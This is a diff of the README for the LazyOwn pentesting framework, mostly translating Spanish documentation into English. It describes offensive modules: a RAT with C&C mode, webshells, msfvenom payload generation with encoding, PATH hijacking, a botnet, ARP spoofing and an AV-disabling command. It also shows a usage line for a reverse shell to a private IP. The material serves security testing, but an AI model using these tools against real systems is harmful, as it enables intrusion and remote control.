@@ -19,6 +19,9 @@
 
 ![LazyOwn1](https://github.com/user-attachments/assets/1debaed0-8f84-4079-ad2f-48cc4cfd9d95)
 
+LazyOwn comes with ABSOLUTELY NO WARRANTY. This is free software, and you are  welcome to redistribute it under the terms of the GNU General Public License v3.
+See the LICENSE file for details about using this software.
+
 LazyOwn Framework is a powerful and versatile security framework designed to automate and streamline pentesting and vulnerability analysis tasks. This interactive environment combines multiple tools and scripts, making it easier for cybersecurity professionals to work through various stages of the security assessment lifecycle. With an intuitive command-line interface, LazyOwn allows users to configure specific parameters, execute custom scripts, and obtain real-time results, all from a single platform.
 
 Key Features:
@@ -78,8 +81,8 @@ Revolutionize Your Pentesting with LazyOwn: Automate the intrusion on Linux, MAC
 Discover LazyOwn, the ultimate solution for automating the pentesting workflow to attack Linux, MacOSX and Windows systems. Our powerful tool simplifies pentesting, making it more efficient and effective. Watch this video to learn how LazyOwn can streamline your security assessments and enhance your cybersecurity toolkit.
 
 ```sh
-LazyOwn> set target_ip 192.168.1.1
-[SET] target_ip set to 192.168.1.1
+LazyOwn> set rhost 192.168.1.1
+[SET] rhost set to 192.168.1.1
 LazyOwn> run lazynmap
 [INFO] Running Nmap scan on 192.168.1.1
 ...
@@ -87,7 +90,7 @@ LazyOwn> run lazynmap
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/9f30a1a3-dfe8-4cc1-9bd7-76c21bdc64b7)
 
-LazyOwn es ideal para profesionales de la ciberseguridad que buscan una solución centralizada y automatizada para sus necesidades de pentesting, ahorrando tiempo y mejorando la eficiencia en la identificación y explotación de vulnerabilidades.
+LazyOwn is ideal for cybersecurity professionals seeking a centralized and automated solution for their pentesting needs, saving time and enhancing efficiency in identifying and exploiting vulnerabilities.
 
 ![Captura de pantalla 2024-05-22 021136](https://github.com/grisuno/LazyOwn/assets/1097185/9a348e76-d667-4526-bdef-863159ba452d)
 
@@ -112,6 +115,9 @@ LazyOwn es ideal para profesionales de la ciberseguridad que buscan una solució
   - keyboard
   - flask-unsign
   - name-that-hash
+  - certipy-ad
+  - ast
+  
 - `subprocess` (incluido en la biblioteca estándar de Python)
 - `platform` (incluido en la biblioteca estándar de Python)
 - `tkinter` (Opcional para el GUI)
@@ -137,70 +143,102 @@ cd LazyOwn
 
 ```sh
 ./run or ./fast_run_as_r00t.sh 
+
+./run --help
+    [;,;] LazyOwn release/0.1.20
+    Uso: ./run [opciones]
+    Opciones:
+      --help         Muestra esta ayuda
+      -v             Muestra la version
+      -c             Ejecuta un comando del LazyOwn ej: ping
+      --no-banner    No muestra el Banner
+      -s             Run as r00t 
+
+./fast_run_as_r00t.sh --vpn 1 (the number id of your file in vpn directory)
 ```
 
 ```
-Use set <parameter> <value> to set parameters.
-Use show to display current parameter values.
+Use set <parameter> <value> to configure parameters.
+Use show to display the current parameter values.
 Use run <script_name> to execute a script with the set parameters.
 Use exit to exit the CLI.
-Una vez que el shell esté en funcionamiento, puedes utilizar los siguientes comandos:
 
-list: Lista todos los Modulos de LazyOwn
-set <parámetro> <valor>: Establece el valor de un parámetro. Por ejemplo, set target_ip 192.168.1.1.
-show: Muestra los valores actuales de todos los parámetros.
-run <script>: Ejecuta un script específico disponible en el framework.
-Scripts disponibles
+Once the shell is running, you can use the following commands:
 
-LazyOwn> ls
+list: Lists all LazyOwn Modules.
+set <parameter> <value>: Sets the value of a parameter. For example, set rhost 192.168.1.1.
+show: Displays the current values of all parameters.
+run <script>: Executes a specific script available in the framework.
+Available Scripts
+
+┌─[LazyOwn👽192.168.1.92 ~/home/gris/tools/LazyOwn][10.10.11.29][http://lantern.htb/]
+└╼ $ ls
     [+] Available scripts to run: [👽]
-lazysearch                lazysearch_gui            lazyown
-update_db                 lazynmap                  lazyaslrcheck
-lazynmapdiscovery         lazygptcli                lazyburpfuzzer
-lazymetaextract0r         lazyreverse_shell         lazyattack
-lazyownratcli             lazyownrat                lazygath
-lazysniff                 lazynetbios               lazybotnet
-lazybotcli                lazyhoneypot              lazysearch_bot
-lazylfi2rce               lazylogpoisoning          lazymsfvenom
-lazypathhijacking         lazyarpspoofing           lazyftpsniff
-lazyssh77enum             lazywerkzeugdebug
-LazyOwn> ?
+    [+] lazysearch                lazysearch_gui            lazyown                 [👽]
+    [+] update_db                 lazynmap                  lazyaslrcheck           [👽]
+    [+] lazynmapdiscovery         lazygptcli                lazyburpfuzzer          [👽]
+    [+] lazymetaextract0r         lazyreverse_shell         lazyattack              [👽]
+    [+] lazyownratcli             lazyownrat                lazygath                [👽]
+    [+] lazysniff                 lazynetbios               lazybotnet              [👽]
+    [+] lazybotcli                lazyhoneypot              lazysearch_bot          [👽]
+    [+] lazylfi2rce               lazylogpoisoning          lazymsfvenom            [👽]
+    [+] lazypathhijacking         lazyarpspoofing           lazyftpsniff            [👽]
+    [+] lazyssh77enum             lazywerkzeugdebug       [👽]
+┌─[LazyOwn👽192.168.1.92 ~/home/gris/tools/LazyOwn][10.10.11.29][http://lantern.htb/]
+└╼ $ 
+        
+┌─[LazyOwn👽192.168.1.92 ~/home/gris/tools/LazyOwn][10.10.11.29][http://lantern.htb/]
+└╼ $ ?
 
 Documented commands (type help <topic>):
 ========================================
-acknowledgearp     dirsearch           lazywebshell     rpcdump
-acknowledgeicmp    dnsenum             ldapdomaindump   rubeus
-addhosts           dnsmap              list             run
-alias              download_exploit    msf              samrdump
-arpscan            download_resources  nbtscan          set
-asprevbase64       encrypt             nc               sh
-banner             enum4linux          nikto            show
-bloodhound         exit                nmapscripthelp   smbclient
-chisel             fixel               openssl_sclient  smbmap
-clean              fixperm             payload          smbserver
-clock              getcap              ping             snmpcheck
-cme                getnpusers          ports            socat
-conptyshell        getseclist          proxy            sqlmap
-cp                 gobuster            psexec           ss
-cports             gospider            pwd              sshd
-createcredentials  hashcat             py3ttyup         tcpdump_icmp
-createhash         help                pyautomate       vpn
-createrevshell     ignorearp           qa               wfuzz
-createwebshell     ignoreicmp          responder        whatweb
-createwinrevshell  ip                  rev              winbase64payload
-decrypt            john2hash           rhost            wrapper
-dig                lazypwn             rpcclient        www
+EOF                dnsmap              ldapdomaindump       searchhash      
+acknowledgearp     download_exploit    list                 seo             
+acknowledgeicmp    download_resources  lynis                sessionssh      
+addhosts           encode              medusa               sessionsshstrace
+alias              encoderpayload      msf                  set             
+apropos            encrypt             nbtscan              set_proxychains 
+arpscan            enum4linux          nikto                sh              
+asprevbase64       exit                nmapscript           shellcode       
+banner             finalrecon          nmapscripthelp       show            
+base64decode       find                openssl_sclient      skipfish        
+base64encode       fixel               payload              smbclient       
+bloodhound         fixperm             ping                 smbmap          
+chisel             ftp                 portdiscover         smbserver       
+clean              getcap              ports                smtpuserenum    
+clock              getnpusers          portservicediscover  snmpcheck       
+cme                getseclist          proxy                socat           
+conptyshell        gobuster            psexec               sqlmap          
+cp                 gospider            pwd                  ss              
+cports             grisun0             pwncatcs             ssh             
+createcookie       hashcat             py3ttyup             sshd            
+createcredentials  help                pyautomate           swaks           
+createdll          hostdiscover        qa                   tcpdump_capture 
+createhash         hydra               rdp                  tcpdump_icmp    
+createrevshell     id_rsa              responder            tshark_analyze  
+createwebshell     ignorearp           rev                  urldecode       
+createwinrevshell  ignoreicmp          revwin               urlencode       
+creds              img2cookie          rhost                vpn             
+decode             ip                  rot                  wfuzz           
+decrypt            john2hash           rpcclient            whatweb         
+dig                launchpad           rpcdump              winbase64payload
+dirsearch          lazypwn             rubeus               wrapper         
+disableav          lazyscript          run                  www             
+dnsenum            lazywebshell        samrdump           
+
+┌─[LazyOwn👽192.168.1.92 ~/home/gris/tools/LazyOwn][10.10.11.29][http://lantern.htb/]
+└╼ $ 
 
 
 
 ```
-## Tag en youtube
+## Tag in youtube
 <https://www.youtube.com/hashtag/lazyown>
 
 
 ```sh
 LazyOwn> set binary_name my_binary
-LazyOwn> set target_ip 192.168.1.100
+LazyOwn> set rhost 192.168.1.100
 LazyOwn> set api_key my_api_key
 LazyOwn> run lazysearch
 LazyOwn> run lazynmap
@@ -209,41 +247,41 @@ LazyOwn> exit
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/6c8a0b35-cde5-42b3-be73-eb45b3f821f0)
 
-para las busquedas
+For searching within the scraped database obtained from GTFOBins.
 
 ```sh
 python3 lazysearch.py binario_a_buscar
 ```
 
-## Busquedas con GUI
-
-Características adicionales y cambios:
+## Searches with GUI
+Additional Features and Enhancements:
 AutocompleteEntry:
 
-Se ha agregado un filtro para eliminar valores None de la lista de autocompletar.
-Nuevo Vector de Ataque:
+A filter has been added to remove None values from the autocomplete list.
+New Attack Vector:
 
-Añadido un botón "Nuevo Vector de Ataque" en la interfaz principal.
-Implementada la funcionalidad para agregar un nuevo vector de ataque y guardar los datos actualizados en los archivos Parquet.
-Exportar a CSV:
+A "New Attack Vector" button has been added to the main interface.
+Functionality has been implemented to add a new attack vector and save the updated data in Parquet files.
+Export to CSV:
 
-Añadido un botón "Exportar a CSV" en la interfaz principal.
-Implementada la funcionalidad para exportar los datos del DataFrame a un archivo CSV seleccionado por el usuario.
-Uso:
-Agregar un nuevo vector de ataque: Hacer clic en el botón "Nuevo Vector de Ataque", llenar los campos y guardar.
-Exportar a CSV: Hacer clic en el botón "Exportar a CSV" y seleccionar la ubicación para guardar el archivo CSV.
+A "Export to CSV" button has been added to the main interface.
+Functionality has been implemented to export DataFrame data to a user-selected CSV file.
+Usage:
 
-Nueva Función scan_system_for_binaries:
+Add a New Attack Vector: Click the "New Attack Vector" button, fill in the fields, and save.
+Export to CSV: Click the "Export to CSV" button and select the location to save the CSV file.
+New Function scan_system_for_binaries:
 
-Implementa la búsqueda de binarios en el sistema utilizando el comando file para determinar si un archivo es binario.
-Se utiliza os.walk para recorrer el sistema de archivos.
-Los resultados se muestran en una nueva ventana de la GUI.
-Botón para Buscar Binarios:
+Implements system-wide binary searches using the file command to determine if a file is binary.
+Uses os.walk to traverse the file system.
+Results are displayed in a new window within the GUI.
+Button to Search for Binaries:
 
-Se ha añadido un botón "Buscar Binarios en el Sistema" en la interfaz principal que llama a la función scan_system_for_binaries.
-Nota:
-La función is_binary utiliza el comando file de Unix para determinar si un archivo es un ejecutable binario. Si estás en un sistema operativo diferente, necesitarás ajustar este método para que sea compatible.
-Esta implementación puede ser intensiva en recursos, ya que recorre todo el sistema de archivos. Podrías añadir opciones adicionales para limitar la búsqueda a directorios específicos o añadir un filtro para ciertos tipos de archivos.
+A "Search System for Binaries" button has been added to the main interface, which calls the scan_system_for_binaries function.
+Note:
+
+The is_binary function uses the Unix file command to determine if a file is a binary executable. If you are on a different operating system, you will need to adjust this method for compatibility.
+This implementation can be resource-intensive as it traverses the entire file system. You may consider adding additional options to limit the search to specific directories or filter for certain file types.
 
 ```sh
 python3 LazyOwnExplorer.py
@@ -251,13 +289,13 @@ python3 LazyOwnExplorer.py
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/87c4be70-66a4-4e84-bdb6-fdfdb89a3f94)
 
-para ejecutar una busqueda contra la maquina a analizar
+
 
 ```sh
 python3 lazyown.py
 ```
 
-en el caso de querer actualizar hacemos
+If you want to update, we proceed as follows:
 
 ```sh
 cd LazyOwn
@@ -266,287 +304,9 @@ rm *.parquet
 ./update_db.sh
 ```
 
-El proyecto consta de tres scripts principales:
+## Use mode LazyOwn WebShells
 
-1. search.py
-Este script extrae información de binarios y sus funciones desde GTFOBins y la guarda en un archivo CSV. ya hice el scraping así que mejor evitar y usar la db que ya tiene en formato csv, a menos que quieran actualizar la db
-
-```python
-import requests
-from bs4 import BeautifulSoup
-import csv
-
-# URL del servidor que contiene el HTML
-url = "https://gtfobins.github.io/index.html"
-
-# Hacer una solicitud GET al servidor
-response = requests.get(url)
-
-# Verificar si la solicitud fue exitosa
-if response.status_code == 200:
-    html_content = response.text
-else:
-    print("Error al obtener el HTML del servidor")
-    exit()
-
-# Parsear el contenido HTML con Beautiful Soup
-soup = BeautifulSoup(html_content, 'html.parser')
-
-# Encontrar el contenedor de la tabla
-table_wrapper = soup.find('div', id='bin-table-wrapper')
-
-# Inicializar una lista para almacenar la información
-data = []
-
-# Recorrer todas las filas de la tabla
-for row in table_wrapper.find_all('tr'):
-    bin_name = row.find('a', class_='bin-name')
-    if bin_name:
-        bin_name_text = bin_name.text.strip()
-        functions = []
-        for func in row.find_all('li'):
-            function_link = func.find('a')
-            if function_link:
-                function_href = function_link.get('href').strip()
-                function_name = function_link.text.strip()
-                functions.append({'name': function_name, 'href': function_href})
-        
-        # Añadir la información a la lista de datos
-        data.append({'binary': bin_name_text, 'functions': functions})
-
-# Guardar la información en un archivo CSV
-csv_file = "bin_data.csv"
-with open(csv_file, mode='w', newline='') as file:
-    writer = csv.writer(file)
-    writer.writerow(['Binary', 'Function Name', 'Function URL'])
-    for entry in data:
-        binary = entry['binary']
-        for func in entry['functions']:
-            writer.writerow([binary, func['name'], func['href']])
-
-print(f"Datos guardados en {csv_file}")
-
-```
-
-## 2. detailed_search.py
-
-Este script lee el archivo CSV generado por scrape_bins.py, extrae detalles adicionales de cada función y guarda los datos en un segundo archivo CSV.
-
-```python
-import requests
-from bs4 import BeautifulSoup
-import csv
-from urllib.parse import urljoin
-import time
-import os
-
-# URL base del servidor
-base_url = "https://gtfobins.github.io/"
-
-# Nombre del archivo CSV de entrada
-input_csv = "bin_data.csv"
-
-# Nombre del archivo de salida CSV
-output_csv = "bin_data_relevant.csv"
-
-# Función para obtener la información relevante de una URL
-def obtener_informacion(url):
-    response = requests.get(url)
-    if response.status_code != 200:
-        print(f"Error al obtener la URL: {url}")
-        return []
-    
-    soup = BeautifulSoup(response.text, 'html.parser')
-    data = []
-
-    for section in soup.find_all('h2', class_='function-name'):
-        function_name = section.text.strip()
-        function_id = section.get('id')
-        function_url = f"{url}#{function_id}"
-        description = section.find_next('p').text.strip() if section.find_next('p') else ""
-        example = section.find_next('code').text.strip() if section.find_next('code') else ""
-
-        data.append({
-            "function_name": function_name,
-            "function_url": function_url,
-            "description": description,
-            "example": example
-        })
-
-    return data
-
-# Leer el archivo CSV de entrada
-binarios_funciones = {}
-with open(input_csv, mode='r', encoding='utf-8') as file:
-    reader = csv.DictReader(file)
-    for row in reader:
-        binary = row['Binary']
-        if binary not in binarios_funciones:
-            binarios_funciones[binary] = row['Function URL'].split('#')[0]
-
-# Verificar si ya existe un archivo de salida y hasta dónde se ha procesado
-resume = False
-if os.path.exists(output_csv):
-    with open(output_csv, mode='r', encoding='utf-8') as file:
-        reader = csv.reader(file)
-        rows = list(reader)
-        if len(rows) > 1:
-            last_processed = rows[-1][2]
-            resume = True
-
-# Inicializar una lista para almacenar toda la información
-informacion_binarios = []
-
-# Abrir el archivo CSV para escritura
-csv_file = open(output_csv, mode='w', newline='', encoding='utf-8')
-csv_writer = csv.writer(csv_file)
-csv_writer.writerow(['Binary', 'Function Name', 'Function URL', 'Description', 'Example'])
-
-# Recorrer la lista de binarios y sus funciones
-for binary, url in binarios_funciones.items():
-    # Si estamos retomando desde un punto anterior, saltamos hasta el último URL procesado
-    if resume:
-        if url != last_processed:
-            continue
-        else:
-            resume = False
-    full_url = urljoin(base_url, url)
-    
-    informacion = obtener_informacion(full_url)
-    for item in informacion:
-        informacion_binarios.append({
-            "binary": binary,
-            "function_name": item["function_name"],
-            "function_url": item["function_url"],
-            "description": item["description"],
-            "example": item["example"]
-        })
-        # Guardar la información en el archivo CSV
-        csv_writer.writerow([binary, item['function_name'], item['function_url'], item['description'], item['example']])
-        print(f"[+] Binary: {binary} {item['function_name']}")
-    # Hacemos una pausa de 5 segundos entre cada solicitud de URL
-    time.sleep(5)
-
-# Cerrar el archivo CSV
-csv_file.close()
-
-print(f"Datos guardados en {output_csv}")
-
-```
-
-3. lazyown.py
-Este script analiza los binarios en el sistema y genera opciones basadas en la información recopilada. Detecta si el sistema operativo es Linux o Windows y ejecuta el comando adecuado para buscar binarios con permisos elevados.
-
-```python
-import pandas as pd
-import os
-import subprocess
-import platform
-
-# Lee los CSVs y crea los DataFrames
-df1 = pd.read_csv('bin_data.csv')
-df2 = pd.read_csv('bin_data_relevant.csv')
-
-# Guarda los DataFrames como Parquet
-df1.to_parquet('binarios.parquet')
-df2.to_parquet('detalles.parquet')
-
-# Función para realizar la búsqueda y generar el CSV de salida
-def buscar_binarios():
-    binarios_encontrados = set()
-    
-    # Detecta el sistema operativo
-    sistema_operativo = platform.system()
-    
-    if sistema_operativo == 'Linux':
-        # Ejecuta el comando find para Linux
-        result = subprocess.run(['find', '/', '-perm', '4000', '-ls'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        output = result.stdout
-        
-        # Extrae los binarios encontrados
-        for line in output.split('\n'):
-            if line:
-                binario = os.path.basename(line.split()[-1])
-                binarios_encontrados.add(binario)
-    
-    elif sistema_operativo == 'Windows':
-        # Script de PowerShell para Windows
-        powershell_script = """
-        $directories = @("C:\\Windows\\System32", "C:\\", "C:\\Program Files", "C:\\Program Files (x86)")
-        foreach ($dir in $directories) {
-            Get-ChildItem -Path $dir -Recurse -Filter *.exe -ErrorAction SilentlyContinue | 
-            ForEach-Object {
-                $acl = Get-Acl $_.FullName
-                $privileges = $acl.Access | Where-Object { $_.FileSystemRights -match "FullControl" }
-                if ($privileges) {
-                    Write-Output "$($_.FullName)"
-                }
-            }
-        }
-        """
-        
-        # Ejecuta el script de PowerShell
-        result = subprocess.run(['powershell', '-Command', powershell_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        output = result.stdout
-        
-        # Extrae los binarios encontrados
-        for line in output.split('\n'):
-            if line:
-                binario = os.path.basename(line.strip())
-                binarios_encontrados.add(binario)
-    
-    # Filtra el DataFrame principal con los binarios encontrados
-    df_binarios_encontrados = df1[df1['Binary'].isin(binarios_encontrados)]
-    
-    # Genera un CSV con los detalles de los binarios encontrados
-    with open('resultado.csv', 'w') as f:
-        for binario in binarios_encontrados:
-            detalles = df2[df2['Binary'] == binario]
-            if not detalles.empty:
-                f.write(detalles.to_csv(index=False, header=False))
-                print(detalles.to_csv(index=False, header=False))
-
-# Función para ejecutar opciones basadas en los datos encontrados
-def ejecutar_opciones():
-    df_resultado = pd.read_csv('resultado.csv', header=None, names=['Binary', 'Function Name', 'Function URL', 'Description', 'Example'])
-    
-    for binario in df_resultado['Binary'].unique():
-        print(f"Binario encontrado: {binario}")
-        detalles = df_resultado[df_resultado['Binary'] == binario]
-
-        print("Opciones:")
-        for i, (_, row) in enumerate(detalles.iterrows(), start=1):
-            print(f"{i}. {row['Function Name']} - {row['Description']}")
-        print(f"{i+1}. No hacer nada y salir")
-        
-        while True:
-            opcion = input("Seleccione una opción: ")
-            if opcion.isdigit() and 1 <= int(opcion) <= len(detalles) + 1:
-                break
-            else:
-                print("Opción no válida. Por favor, intente de nuevo.")
-        
-        opcion = int(opcion)
-        
-        if opcion <= len(detalles):
-            print(f"Ejecutando opción {opcion} para {binario}")
-            # Código para ejecutar la opción correspondiente
-            print(f"Ejemplo de ejecución:\n{detalles.iloc[opcion-1]['Example']}")
-            # Aquí puedes agregar el código para ejecutar el ejemplo si es necesario
-        else:
-            print("Saliendo")
-            break
-
-if __name__ == '__main__':
-    buscar_binarios()
-    ejecutar_opciones()
-
-```
-
-## Uso modo LazyOwn WebShells
-
-LazyOwn Webshell Collection es una colleccion de webshells para nuestro framework, el cual nos permite mediante distintos lenguajes establecer una webshell en la maquina donde ejecutemos lazyown webshell basicamente lo que hace es levantar un servidor web dentro del directorio modules para que así esté visible mediante el navegador así podemos tanto disponivilizar los modulos por separados mediante web como tambien podemos acceder al directorio cgi-bin en donde hay 4 shells una bash otra en perl otra en python y en asp por
-si fuera un windwos
+LazyOwn Webshell Collection is a collection of webshells for our framework, which allows us to establish a webshell on the machine where we run LazyOwn using various programming languages. Essentially, LazyOwn Webshell raises a web server within the modules directory, making it accessible via a web browser. This allows us to both make the modules available separately through the web and access the cgi-bin directory, where there are four shells: one in Bash, another in Perl, another in Python, and one in ASP, in case the target is a Windows machine.
 
 ```sh
 lazywebshell
@@ -564,25 +324,36 @@ y listo ya podemos acceder a cualquiera de estas url:
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/fc0ea814-7044-4f8f-8979-02f9579e9df9)
 
-## Uso Lazy MSFVenom para Reverse Shell
+## Use Lazy MSFVenom to Reverse Shell
 
-se crearán 3 archivos uno para windows uno para linux y uno para mac con el nombre shell.exe, shell.elf, shell.macho respectivamente y se invoca con el comando run lazymsfvenom
+    Executes the `msfvenom` tool to generate a variety of payloads based on user input.
+
+    This function prompts the user to select a payload type from a predefined list and runs the corresponding
+    `msfvenom` command to create the desired payload. It handles tasks such as generating different types of
+    payloads for Linux, Windows, macOS, and Android systems, including optional encoding with Shikata Ga Nai for C payloads.
+
+    The generated payloads are moved to a `sessions` directory, where appropriate permissions are set. Additionally,
+    the payloads can be compressed using UPX for space efficiency. If the selected payload is an Android APK,
+    the function will also sign the APK and perform necessary post-processing steps.
+
+    :param line: Command line arguments for the script.
+    :return: None
 
 ```sh
-run lazymsfvenom
+run lazymsfvenom or venom
 ```
 
-## Uso Lazy PATH Hijacking
+## Use Lazy PATH Hijacking
 
-se crearán un archivo en /tmp con el nombre de binary_name seteado en payload inicializado con gzip en memoria y como bash en payload parasetear el payload desde el json usar el comando payload para ejecutar usar:
+A file will be created in /tmp with the name binary_name set in the payload, initialized with gzip in memory, and using bash in the payload. To set the payload from the JSON, use the payload command to execute. Use:
 
 ```sh
 lazypathhijacking
 ```
 
-## Uso modo LazyOwn RAT
+## Use mode LazyOwn RAT
 
-LazyOwn RAT es una sencilla pero potente Remote Admin Tool Cuenta con una funcion de Screenshot, el cual captura la pantalla del servidor, tiene un comando upload, el cual nos permite subir archivos a la maquina comprometida, y un modo C&C donde podran enviar comandos al servidor, cuenta con dos modos en modo cliente y modo servidor, no tiene ningun tipo de ofuscación y la rat me base en BasicRat acá su github <https://github.com/awesome-security/basicRAT> y en <https://github.com/hash3liZer/SillyRAT> aun que está ultima es mucho más completa yo solo queria sacar pantallasos subir archivos y enviar comandos, quizas más adelante agregar funcionalidad de mirar webcams, pero eso más adelante.
+LazyOwn RAT is a simple yet powerful Remote Administration Tool. It features a screenshot function that captures the server's screen, an upload command that allows us to upload files to the compromised machine, and a C&C mode where commands can be sent to the server. It operates in two modes: client mode and server mode. There is no obfuscation, and the RAT is based on BasicRat. You can find it on GitHub at https://github.com/awesome-security/basicRAT and at https://github.com/hash3liZer/SillyRAT. Although the latter is much more comprehensive, I just wanted to implement screenshot capture, file uploads, and command sending. Perhaps in the future, I will add webcam viewing functionality, but that will come later.
 
 ```sh
 usage: lazyownserver.py [-h] [--host HOST] [--port PORT] --key KEY
@@ -609,9 +380,9 @@ lazyownreverse 192.168.1.100 8888 #Reverse shell to 192.168.1.100 on port 8888 r
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/2bb7ec40-0d89-4ca6-87ff-2baa62781648)
 
-## Uso modo Lazy Meta Extract0r
+## Use mode Lazy Meta Extract0r
 
-LazyMeta Extract0r es una herramienta diseñada para extraer metadata de varios tipos de archivos, incluidos PDF, DOCX, archivos OLE (como DOC y XLS), y varios formatos de imágenes (JPG, JPEG, TIFF). Esta herramienta recorrerá un directorio especificado, buscará archivos con extensiones compatibles, extraerá la metadata y la guardará en un archivo de salida.
+LazyMeta Extract0r is a tool designed to extract metadata from various types of files, including PDF, DOCX, OLE files (such as DOC and XLS), and several image formats (JPG, JPEG, TIFF). This tool will traverse a specified directory, search for files with compatible extensions, extract the metadata, and save it to an output file.
 
 [*] Iniciando: LazyMeta extract0r [;,;]
 
@@ -624,9 +395,9 @@ python3 lazyown_metaextract0r.py --path /home/user
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/9ec77c01-4bc1-48ab-8c34-7457cff2f79f)
 
-## Uso modo decrypt encrypt
+## Use mode decrypt encrypt
 
-un metodo de cifrado el cual nos permite tanto encryptar archivos como decencriptar los si se cuenta con la llave obviamente:
+A encryption method that allows us to both encrypt files and decrypt them if we have the key, of course.
 
 ![Captura de pantalla 2024-06-08 231900](https://github.com/grisuno/LazyOwn/assets/1097185/15158dbd-6cd6-4e20-a237-6c89983d42ce)
 
@@ -637,8 +408,7 @@ decrypt path/to/file.enc key #to decrypt
 
 ## Uso modo LazyNmap
 
-El uso Lazynmap nos proporciona un script automatizado de un target en este caso 127.0.0.1 utilizando nmap el scipr requiere permisos de administración mediante sudo.
-tambien tiene un modulo de net discovery para saber que hay en el segmento de ip en el que te encuentras.
+The use of Lazynmap provides us with an automated script for a target, in this case, 127.0.0.1, using Nmap. The script requires administrative permissions via sudo. It also includes a network discovery module to identify what is present in the IP segment you are in. Additionally, the script can now be called without parameters using the alias nmap or with the command run lazynmap.
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/48a38836-6cf5-4676-bea8-063e0b5cf7ad)
 
@@ -646,53 +416,50 @@ tambien tiene un modulo de net discovery para saber que hay en el segmento de ip
 ./lazynmap.sh -t 127.0.0.1 
 ```
 
-## Uso modo Chat Generativo por Consola LazyOwn GPT One Liner CLI Assistant y researcher
+## Usage of LazyOwn GPT One Liner CLI Assistant and Researcher
 
-¡Descubre la revolución en automatización de tareas de pentesting con el LazyOwn GPT One Liner CLI Assistant! Este increíble script forma parte de la suite de herramientas LazyOwn, diseñadas para hacer tu vida como pentester más eficiente y productiva.
+Discover the revolution in automating pentesting tasks with the LazyOwn GPT One Liner CLI Assistant! This incredible script is part of the LazyOwn tool suite, designed to make your life as a pentester more efficient and productive.
 
-🚀 Principales Características:
+🚀 Key Features:
 
-Automatización Inteligente: Utiliza la potencia de Groq y modelos avanzados de lenguaje natural para generar comandos precisos y eficientes basados en tus necesidades específicas.
-Interfaz Amigable: Con un simple prompt, el asistente genera y ejecuta scripts de una línea, reduciendo drásticamente el tiempo y esfuerzo en la creación de comandos complejos.
-Mejora Continua: Transforma y optimiza continuamente su base de conocimientos para proporcionarte las mejores soluciones, adaptándose a cada situación.
-Depuración Simplificada: Habilita el modo debug para obtener información detallada de cada paso, facilitando la identificación y corrección de errores.
-Integración Perfecta: Funciona sin problemas con tu entorno de trabajo, aprovechando el poder de la API de Groq para ofrecerte respuestas rápidas y precisas.
+Intelligent Automation: Leverages the power of Groq and advanced natural language models to generate precise and efficient commands based on your specific needs.
+User-Friendly Interface: With a simple prompt, the assistant generates and executes one-liner scripts, drastically reducing the time and effort involved in creating complex commands.
+Continuous Improvement: Continuously transforms and optimizes its knowledge base to provide you with the best solutions, adapting to each situation.
+Simplified Debugging: Enable debug mode to obtain detailed information at every step, facilitating the identification and correction of errors.
+Seamless Integration: Works effortlessly within your workspace, harnessing the power of the Groq API to deliver quick and accurate responses.
+🔒 Security and Control:
 
-🔒 Seguridad y Control:
+Safe Error Handling: Intelligently detects and responds to execution errors, ensuring you maintain full control over each generated command.
+Controlled Execution: Before executing any command, it requests your confirmation, giving you peace of mind knowing exactly what is being executed on your system.
+🌐 Easy Configuration:
 
-Manejo Seguro de Errores: Detecta y responde inteligentemente a errores de ejecución, asegurando que siempre tengas el control total de cada comando generado.
-Ejecución Controlada: Antes de ejecutar cualquier comando, solicita tu confirmación, brindándote la tranquilidad de saber exactamente qué se está ejecutando en tu sistema.
+Set up your API key in seconds and start enjoying all the benefits offered by the LazyOwn GPT One Liner CLI Assistant. A quick start guide is available to help you configure and maximize the potential of this powerful tool.
 
-🌐 Configuración Sencilla:
+🎯 Ideal for Pentesters and Developers:
 
-Configura tu API key en segundos y comienza a disfrutar de todas las ventajas que ofrece el LazyOwn GPT One Liner CLI Assistant.
-La guía de inicio rápido está disponible para ayudarte a configurar y sacar el máximo provecho de esta poderosa herramienta.
+Optimize Your Processes: Simplify and accelerate command generation in your security audits.
+Continuous Learning: The knowledge base is constantly updated and improved, always providing you with the latest best practices and solutions.
+With the LazyOwn GPT One Liner CLI Assistant, transform the way you work, making it faster, more efficient, and secure. Stop wasting time on repetitive and complex tasks, and focus on what truly matters: discovering and resolving vulnerabilities!
 
-🎯 Ideal para Pentesters y Desarrolladores:
+Join the pentesting revolution with LazyOwn and take your productivity to the next level!
 
-Optimiza tus Procesos: Simplifica y acelera la generación de comandos en tus auditorías de seguridad.
-Aprendizaje Continuo: La base de conocimientos se actualiza y mejora constantemente, proporcionándote siempre las mejores prácticas y soluciones más recientes.
-Con el LazyOwn GPT One Liner CLI Assistant, transforma tu forma de trabajar, haciéndola más rápida, eficiente y segura. ¡No pierdas más tiempo en tareas repetitivas y complejas, y enfócate en lo que realmente importa: descubrir y solucionar vulnerabilidades!
+[?] Usage: python lazygptcli.py --prompt "<your prompt>" [--debug]
 
-¡Únete a la revolución del pentesting con LazyOwn y lleva tu productividad al siguiente nivel!
+[?] Options:
 
-[?] Uso: python lazygptcli.py --prompt "<tu prompt>" [--debug]
+--prompt "The prompt for the programming task (required)."
+--debug, -d "Enables debug mode to display debug messages."
+--transform "Transforms the original knowledge base into an enhanced base using Groq."
+[?] Ensure you configure your API key before running the script:
+export GROQ_API_KEY=<your_api_key>
+[->] Visit: https://console.groq.com/docs/quickstart (not a sponsored link)
 
-[?] Opciones:
-  --prompt    "El prompt para la tarea de programación (requerido)."
-  --debug, -d "Habilita el modo debug para mostrar mensajes de depuración."
-  --transform "Transforma la base de conocimientos original en una base mejorada usando Groq."
+Requirements:
 
-[?] Asegúrate de configurar tu API key antes de ejecutar el script:
-  export GROQ_API_KEY=<tu_api_key>
-[->] visit: <https://console.groq.com/docs/quickstart> not sponsored link
-
-Requisitos:
 Python 3.x
-Una API key válida de Groq
-Pasos para Obtener la API Key de Groq:
-Visita Groq Console (<https://console.groq.com/docs/quickstart>) para registrarte y obtener una API key.
-
+A valid Groq API key
+Steps to Obtain the Groq API Key:
